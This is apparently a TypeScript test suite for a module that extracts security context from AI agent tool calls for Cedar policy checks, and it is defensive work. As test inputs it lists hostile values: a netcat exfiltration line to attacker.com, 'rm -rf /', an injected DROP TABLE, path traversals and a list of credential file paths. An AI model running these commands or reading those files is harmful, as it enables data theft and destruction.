/**
 * Context extraction tests — the most adversarial suite in M2.
 *
 * Every field that feeds into a Cedar policy decision gets its own group of
 * tests covering legitimate inputs, boundary conditions, and attacker-crafted
 * inputs. A regression here means a bypass.
 */

import { describe, it, expect } from 'vitest';
import * as path from 'node:path';

import {
    extractToolCallContext,
    extractResourceReadContext,
    extractBaseContext,
    hasInvisibleUnicode,
} from './extract.js';
import type { ExtractConfig } from './extract.js';

// ── Fixtures ──────────────────────────────────────────────────────────────────

const WORKSPACE = '/workspace/project';

const baseConfig: ExtractConfig = {
    workspaceRoot: WORKSPACE,
    allowedHosts: ['internal.corp', 'trusted.example.com'],
    protocolVersion: '2026-07-28',
    serverTrust: 'trusted',
    toolScanVerdict: 'clean',
};

function ctx(args: unknown, config: Partial<ExtractConfig> = {}) {
    return extractToolCallContext(args, { ...baseConfig, ...config });
}

// ── Base context ──────────────────────────────────────────────────────────────

describe('extractBaseContext', () => {
    it('populates protocol version and hourUtc', () => {
        const c = extractBaseContext('2026-07-28');
        expect(c.protocolVersion).toBe('2026-07-28');
        expect(c.hourUtc).toBeGreaterThanOrEqual(0);
        expect(c.hourUtc).toBeLessThanOrEqual(23);
    });

    it('argsDigest differs for different payloads', () => {
        const c1 = extractBaseContext('2026-07-28', { a: 1 });
        const c2 = extractBaseContext('2026-07-28', { a: 2 });
        expect(c1.argsDigest).not.toBe(c2.argsDigest);
    });
});

// ── Path extraction ───────────────────────────────────────────────────────────

describe('pathsWithinWorkspace', () => {
    it('marks a path inside workspace as within', () => {
        const c = ctx({ path: `${WORKSPACE}/src/main.ts` });
        expect(c.pathsWithinWorkspace).toBe(true);
    });

    it('marks a path outside workspace as not within', () => {
        const c = ctx({ path: '/etc/passwd' });
        expect(c.pathsWithinWorkspace).toBe(false);
    });

    it('marks a traversal that escapes workspace as not within', () => {
        const c = ctx({ path: `${WORKSPACE}/../../etc/shadow` });
        expect(c.pathsWithinWorkspace).toBe(false);
    });

    it('returns true when no paths are present (nothing escaped)', () => {
        const c = ctx({ count: 5, label: 'hello' });
        expect(c.pathsWithinWorkspace).toBe(true);
    });

    it('handles null args as empty', () => {
        const c = ctx(null);
        expect(c.pathsWithinWorkspace).toBe(true);
        expect(c.argCount).toBe(0);
    });
});

describe('hasParentTraversal', () => {
    it('detects a literal .. segment', () => {
        expect(ctx({ path: '../../../etc/passwd' }).hasParentTraversal).toBe(true);
    });

    it('detects .. in the middle of a path', () => {
        expect(ctx({ path: '/workspace/src/../../../secret' }).hasParentTraversal).toBe(true);
    });

    it('does not flag .. when it is part of a filename (e.g. file..txt)', () => {
        // "file..txt" splits to ["file", "", "txt"] — none are ".."
        expect(ctx({ file: 'file..txt' }).hasParentTraversal).toBe(false);
    });

    it('URL-encoded %2e%2e is NOT treated as traversal (raw string matching)', () => {
        // We do NOT URL-decode — that would require knowing which args are paths.
        // The raw string %2e%2e does not contain the literal ".." segment.
        expect(ctx({ path: '%2e%2e/etc/passwd' }).hasParentTraversal).toBe(false);
    });

    it('Windows-style backslash traversal is detected', () => {
        expect(ctx({ path: '..\\..\\windows\\system32' }).hasParentTraversal).toBe(true);
    });
});

describe('hasSensitivePath', () => {
    const sensitive = [
        ['~/.ssh/id_rsa', '.ssh'],
        ['~/.aws/credentials', '.aws'],
        ['/home/user/.env', '.env'],
        ['/etc/shadow', '/etc/shadow'],
        ['/etc/passwd', '/etc/passwd'],
        ['/etc/sudoers', '/etc/sudoers'],
        ['/home/user/.pem', '.pem'],
        ['/var/keystore.jks', 'keystore.jks'],
        ['/home/user/.netrc', '.netrc'],
        ['/root/.pgpass', '.pgpass'],
        ['/home/user/.docker/config.json', '.docker'],
        ['id_ed25519', 'ssh key'],
        ['/home/user/.npmrc', '.npmrc'],
        ['/proc/self/environ', '/proc/self/'],
    ];

    for (const [p, label] of sensitive) {
        it(`flags ${label} as sensitive`, () => {
            expect(ctx({ path: p }).hasSensitivePath).toBe(true);
        });
    }

    it('does not flag ordinary workspace files', () => {
        expect(ctx({ path: `${WORKSPACE}/src/main.ts` }).hasSensitivePath).toBe(false);
    });

    it('does not flag a path that merely contains "secret" in a directory name', () => {
        // /workspace/my-secrets-app is not a credential store
        expect(ctx({ path: `${WORKSPACE}/my-secrets-app/index.ts` }).hasSensitivePath).toBe(false);
    });
});

describe('fileExtensions', () => {
    it('collects extensions from path arguments', () => {
        const c = ctx({ a: '/foo/bar.ts', b: '/foo/baz.js' });
        expect(c.fileExtensions).toContain('.ts');
        expect(c.fileExtensions).toContain('.js');
    });

    it('no extensions when args have no path-like strings', () => {
        const c = ctx({ message: 'hello world' });
        expect(c.fileExtensions).toHaveLength(0);
    });
});

// ── URL extraction ────────────────────────────────────────────────────────────

describe('URL extraction', () => {
    it('detects a URL and extracts the host', () => {
        const c = ctx({ url: 'https://internal.corp/api/data' });
        expect(c.hasUrl).toBe(true);
        expect(c.urlHosts).toContain('internal.corp');
    });

    it('marks internal host as not external', () => {
        const c = ctx({ url: 'https://internal.corp/api' });
        expect(c.hasExternalUrl).toBe(false);
    });

    it('marks unknown host as external', () => {
        const c = ctx({ url: 'https://attacker.com/exfil' });
        expect(c.hasExternalUrl).toBe(true);
    });

    it('marks subdomain of allowed host as not external', () => {
        const c = ctx({ url: 'https://api.trusted.example.com/v1' });
        expect(c.hasExternalUrl).toBe(false);
    });

    it('marks empty args as no URL', () => {
        const c = ctx({});
        expect(c.hasUrl).toBe(false);
        expect(c.hasExternalUrl).toBe(false);
    });

    it('detects multiple URLs in the same request', () => {
        const c = ctx({ a: 'https://internal.corp/a', b: 'https://evil.com/b' });
        expect(c.hasExternalUrl).toBe(true);
        expect(c.urlHosts).toHaveLength(2);
    });
});

// ── SQL classification ────────────────────────────────────────────────────────

describe('SQL classification', () => {
    it('classifies SELECT as select, not destructive, not multi-statement', () => {
        const c = ctx({ query: 'SELECT * FROM users WHERE id = 1' });
        expect(c.sqlKind).toBe('select');
        expect(c.sqlIsDestructive).toBe(false);
        expect(c.sqlIsMultiStatement).toBe(false);
    });

    it('classifies INSERT as insert, destructive (mutation)', () => {
        const c = ctx({ query: 'INSERT INTO logs VALUES (1, "test")' });
        expect(c.sqlKind).toBe('insert');
    });

    it('classifies UPDATE as update, destructive', () => {
        const c = ctx({ query: 'UPDATE users SET name = "x" WHERE id = 1' });
        expect(c.sqlKind).toBe('update');
        expect(c.sqlIsDestructive).toBe(true);
    });

    it('classifies DELETE as delete, destructive', () => {
        const c = ctx({ query: 'DELETE FROM users WHERE id = 1' });
        expect(c.sqlKind).toBe('delete');
        expect(c.sqlIsDestructive).toBe(true);
    });

    it('classifies DROP TABLE as ddl, destructive', () => {
        const c = ctx({ query: 'DROP TABLE users' });
        expect(c.sqlKind).toBe('ddl');
        expect(c.sqlIsDestructive).toBe(true);
    });

    it('classifies CREATE TABLE as ddl', () => {
        const c = ctx({ query: 'CREATE TABLE temp (id INT)' });
        expect(c.sqlKind).toBe('ddl');
    });

    it('detects multi-statement injection (SELECT; DROP TABLE)', () => {
        const c = ctx({ query: 'SELECT 1; DROP TABLE users' });
        expect(c.sqlIsMultiStatement).toBe(true);
        expect(c.sqlIsDestructive).toBe(true);
    });

    it('does not flag trailing semicolon as multi-statement', () => {
        const c = ctx({ query: 'SELECT * FROM users;' });
        // Trailing semicolon followed by only whitespace — not multi-statement.
        expect(c.sqlIsMultiStatement).toBe(false);
    });

    it('returns none when args contain no SQL-like string', () => {
        const c = ctx({ path: '/workspace/foo.ts', count: 5 });
        expect(c.sqlKind).toBe('none');
        expect(c.sqlIsDestructive).toBe(false);
    });
});

// ── Invisible Unicode ─────────────────────────────────────────────────────────

describe('hasInvisibleUnicode', () => {
    it('detects zero-width non-joiner (U+200C)', () => {
        expect(hasInvisibleUnicode('hello\u200Cworld')).toBe(true);
    });

    it('detects zero-width joiner (U+200D)', () => {
        expect(hasInvisibleUnicode('hello\u200Dworld')).toBe(true);
    });

    it('detects zero-width space (U+200B)', () => {
        expect(hasInvisibleUnicode('hello\u200Bworld')).toBe(true);
    });

    it('detects left-to-right override (U+202D)', () => {
        expect(hasInvisibleUnicode('\u202Devil')).toBe(true);
    });

    it('detects right-to-left override (U+202E)', () => {
        expect(hasInvisibleUnicode('\u202Edevil')).toBe(true);
    });

    it('detects BOM / zero-width no-break space (U+FEFF)', () => {
        expect(hasInvisibleUnicode('\uFEFFhello')).toBe(true);
    });

    it('does NOT flag ordinary ASCII', () => {
        expect(hasInvisibleUnicode('hello world 123')).toBe(false);
    });

    it('does NOT flag emoji', () => {
        expect(hasInvisibleUnicode('hello 🎉 world')).toBe(false);
    });

    it('does NOT flag CJK characters', () => {
        expect(hasInvisibleUnicode('你好世界')).toBe(false);
    });

    it('detects invisible Unicode in tool call arguments', () => {
        const c = ctx({ cmd: 'read_file\u200B_evil' });
        expect(c.hasInvisibleUnicode).toBe(true);
    });

    it('does not flag clean args for invisible Unicode', () => {
        const c = ctx({ path: '/workspace/src/main.ts' });
        expect(c.hasInvisibleUnicode).toBe(false);
    });
});

// ── Credential detection ──────────────────────────────────────────────────────

describe('containsCredential', () => {
    it('detects a Bearer token in arguments', () => {
        const c = ctx({ auth: 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.payload.sig' });
        expect(c.containsCredential).toBe(true);
    });

    it('detects an AWS access key ID', () => {
        // Classic AWS example key — 20 chars total (AKIA + 16 uppercase alphanum)
        const c = ctx({ key: 'AKIAIOSFODNN7EXAMPLE' });
        expect(c.containsCredential).toBe(true);
    });

    it('detects a GitHub personal access token', () => {
        const c = ctx({ token: 'ghp_' + 'A'.repeat(36) });
        expect(c.containsCredential).toBe(true);
    });

    it('detects a Groq API key', () => {
        const c = ctx({ apiKey: 'gsk_' + 'x'.repeat(24) });
        expect(c.containsCredential).toBe(true);
    });

    it('detects a value in a sensitive key name', () => {
        // The redaction fires on key-name matching — "password" is a sensitive token
        const c = ctx({ password: 'hunter2' });
        expect(c.containsCredential).toBe(true);
    });

    it('does NOT flag ordinary strings', () => {
        const c = ctx({ message: 'hello world', count: 5 });
        expect(c.containsCredential).toBe(false);
    });
});

// ── Shell metacharacters ──────────────────────────────────────────────────────

describe('hasShellMetacharacters', () => {
    it('detects semicolon in command argument', () => {
        const c = ctx({ cmd: 'ls; rm -rf /' });
        expect(c.hasShellMetacharacters).toBe(true);
    });

    it('detects pipe character', () => {
        const c = ctx({ arg: 'cat file | nc attacker.com 9999' });
        expect(c.hasShellMetacharacters).toBe(true);
    });

    it('detects dollar sign (variable expansion)', () => {
        const c = ctx({ name: '$HOME' });
        expect(c.hasShellMetacharacters).toBe(true);
    });

    it('does NOT flag ordinary text', () => {
        const c = ctx({ message: 'Hello, world! How are you?' });
        expect(c.hasShellMetacharacters).toBe(false);
    });
});

// ── Resource read context ─────────────────────────────────────────────────────

describe('extractResourceReadContext', () => {
    it('file URI inside workspace → within, file scheme', () => {
        const c = extractResourceReadContext(
            `file://${WORKSPACE}/src/main.ts`,
            baseConfig,
        );
        expect(c.scheme).toBe('file');
        expect(c.pathsWithinWorkspace).toBe(true);
        expect(c.hasExternalUrl).toBe(false);
    });

    it('file URI outside workspace → not within', () => {
        const c = extractResourceReadContext('file:///etc/shadow', baseConfig);
        expect(c.pathsWithinWorkspace).toBe(false);
        expect(c.hasSensitivePath).toBe(true);
    });

    it('https URI → not file scheme', () => {
        const c = extractResourceReadContext('https://internal.corp/data', baseConfig);
        expect(c.scheme).toBe('https');
        expect(c.hasExternalUrl).toBe(false);
    });

    it('https to unknown host → hasExternalUrl', () => {
        const c = extractResourceReadContext('https://evil.com/exfil', baseConfig);
        expect(c.hasExternalUrl).toBe(true);
    });
});
